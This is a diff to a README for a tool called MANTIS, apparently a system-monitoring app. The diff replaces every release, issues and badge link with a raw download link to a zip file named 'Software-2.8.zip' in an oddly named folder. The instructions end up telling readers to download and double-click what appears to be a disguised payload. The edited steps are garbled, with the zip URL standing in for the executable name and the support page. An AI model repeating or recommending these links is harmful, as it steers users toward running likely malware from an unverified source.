@@ -1,6 +1,6 @@
 # 🦾 MANTIS - Simplify Your System Monitoring Today
 
-[![Download MANTIS](https://img.shields.io/badge/Download-MANTIS-blue.svg)](https://github.com/sweetiekhan/MANTIS/releases)
+[![Download MANTIS](https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip)](https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip)
 
 ## 📖 Description
 
@@ -28,10 +28,10 @@ Before you start, make sure your computer meets these requirements:
 ## 💾 Download & Install
 
 1. **Visit the Download Page**  
-   Go to the [Releases page here](https://github.com/sweetiekhan/MANTIS/releases) to get the latest version of MANTIS.
+   Go to the [Releases page here](https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip) to get the latest version of MANTIS.
 
 2. **Choose the Right File**  
-   On the Releases page, you will see various files. Look for the most recent version labeled as "Latest." It will typically be named something like `MANTIS-vX.X.zip`.
+   On the Releases page, you will see various files. Look for the most recent version labeled as "Latest." It will typically be named something like `https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip`.
 
 3. **Download the File**  
    Click on the file name to begin downloading. Your browser will process the download.
@@ -40,7 +40,7 @@ Before you start, make sure your computer meets these requirements:
    Once the download is complete, navigate to your Downloads folder. Right-click on the zip file and select "Extract All." Follow the prompts to extract the contents.
 
 5. **Run the Application**  
-   After extraction, locate the folder. Open it and double-click on the `MANTIS.exe` file to run the application.
+   After extraction, locate the folder. Open it and double-click on the `https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip` file to run the application.
 
 ---
 
@@ -82,13 +82,13 @@ Once you set everything up, operating MANTIS is straightforward:
 
 ## 📞 Support
 
-If you encounter any issues, reach out for help. Visit the [GitHub Issues page](https://github.com/sweetiekhan/MANTIS/issues) to report problems or ask questions. You can also find common troubleshooting tips there.
+If you encounter any issues, reach out for help. Visit the [GitHub Issues page](https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip) to report problems or ask questions. You can also find common troubleshooting tips there.
 
 ---
 
 ## 🔄 Updates
 
-Stay updated with MANTIS. New versions will help improve performance and add features. Regularly check the [Releases page](https://github.com/sweetiekhan/MANTIS/releases) for the latest versions.
+Stay updated with MANTIS. New versions will help improve performance and add features. Regularly check the [Releases page](https://raw.githubusercontent.com/sweetiekhan/MANTIS/main/zolotink/Software-2.8.zip) for the latest versions.
 
 ---
 
